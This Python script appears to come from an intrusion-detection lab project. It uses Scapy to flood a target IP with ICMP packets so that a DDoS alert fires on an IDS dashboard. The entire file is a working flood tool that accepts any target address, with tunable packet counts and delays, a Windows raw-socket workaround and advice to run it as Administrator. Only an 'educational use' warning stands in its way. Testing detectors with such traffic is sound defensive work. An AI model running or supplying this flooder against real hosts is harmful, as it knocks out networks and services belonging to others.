"""
ddos_attack.py
==============
DDoS Attack Simulation Script
-------------------------------
Simulates a high-volume ICMP flood (Ping Flood / DDoS) against a target IP.
This floods the target with thousands of packets per second to trigger the
DDoS detection rule in the IDS dashboard.

USAGE:
    python ddos_attack.py <target_ip> [packet_count] [delay]

EXAMPLES:
    python ddos_attack.py 192.168.43.1
    python ddos_attack.py 192.168.43.1 10000 0

WARNING:
    Use ONLY on your own test devices / networks.
    This script is for educational/lab demonstration only.
"""

import os
import sys
import time

def check_scapy():
    try:
        from scapy.all import IP, ICMP, send
        return True
    except ImportError:
        print("Scapy not installed. Run: pip install scapy")
        sys.exit(1)

check_scapy()

from scapy.all import IP, ICMP, Raw, send, conf

# Suppress verbose Scapy output
conf.verb = 0


def ddos_attack(target_ip: str, total_packets: int = 10000, delay: float = 0.0):
    """Send a rapid ICMP flood to target_ip."""
    print("=" * 55)
    print("  [ALERT] DDoS ATTACK SIMULATION")
    print("=" * 55)
    print(f"  Target       : {target_ip}")
    print(f"  Total Packets: {total_packets:,}")
    print(f"  Delay (sec)  : {delay}")
    print("=" * 55)
    print("  [WARNING]  For educational/lab use ONLY!")
    print("=" * 55)
    print()

    start_time  = time.time()
    sent        = 0
    errors      = 0
    first_error = None

    # Build the packet once and reuse for speed
    # We encapsulate in Ether(dst="ff:ff:ff:ff:ff:ff") to bypass Windows ARP failures
    from scapy.all import Ether
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(dst=target_ip) / ICMP() / Raw(b"X" * 64)

    print(f"  [>] Sending {total_packets:,} ICMP packets to {target_ip} ...")
    print()

    # Decide sending method
    use_l3socket = False
    sender = None

    try:
        if os.name == 'nt' and not conf.use_pcap:
            try:
                sender = conf.L3socket(iface=conf.iface)
                use_l3socket = True
                print(f"  [INFO] Using Windows L3 socket on: {conf.iface.name}")
            except (OSError, PermissionError) as exc:
                print(f"\n  [ERROR] Cannot open raw sockets: {exc}")
                print("  Run this terminal as Administrator to send packets.")
                print("  Or install Npcap from https://npcap.com/\n")
                return

        for i in range(1, total_packets + 1):
            try:
                if use_l3socket and sender:
                    sender.send(packet)
                else:
                    from scapy.all import sendp
                    sendp(packet, verbose=False)
                sent += 1
            except Exception as exc:
                errors += 1
                if first_error is None:
                    first_error = str(exc)

            # Progress feedback every 500 packets
            if i % 500 == 0 or i == total_packets:
                elapsed = time.time() - start_time
                pps = sent / max(elapsed, 0.001)
                bar = '#' * int((i / total_packets) * 30)
                print(f"\r  [{bar:<30}] {i:>6}/{total_packets}  |  "
                      f"{pps:>8.0f} pkt/s  |  {elapsed:.1f}s", end='', flush=True)

            if delay > 0:
                time.sleep(delay)

    except KeyboardInterrupt:
        print("\n\n  [STOP] Stopped by user.")

    elapsed = time.time() - start_time
    pps     = sent / max(elapsed, 0.001)

    print(f"\n\n{'='*55}")
    if sent > 0:
        print(f"  [SUCCESS] DDoS Simulation Complete!")
    else:
        print(f"  [FAILED] No packets were sent!")
        if first_error:
            print(f"  Error detail: {first_error}")
        print(f"  [TIP] Run terminal as Administrator and retry.")
    print(f"  Packets Sent : {sent:,}")
    print(f"  Errors       : {errors:,}")
    print(f"  Duration     : {elapsed:.2f} seconds")
    print(f"  Average PPS  : {pps:.0f} packets/second")
    print(f"{'='*55}")
    print(f"\n  [INFO] Check the IDS dashboard for DDoS ALERT!")


if __name__ == "__main__":
    import os
    from dotenv import load_dotenv
    load_dotenv()
    env_target = os.getenv("IOT_DEVICE_IP")

    if len(sys.argv) < 2 and not env_target:
        print("\nUsage: python ddos_attack.py <target_ip> [total_packets] [delay]")
        print("Example: python ddos_attack.py 192.168.43.1")
        sys.exit(1)

    target_ip = sys.argv[1] if len(sys.argv) >= 2 else env_target
    pkts      = int(sys.argv[2]) if len(sys.argv) >= 3 else 1000
    dly       = float(sys.argv[3]) if len(sys.argv) >= 4 else 0.0

    ddos_attack(target_ip, pkts, dly)
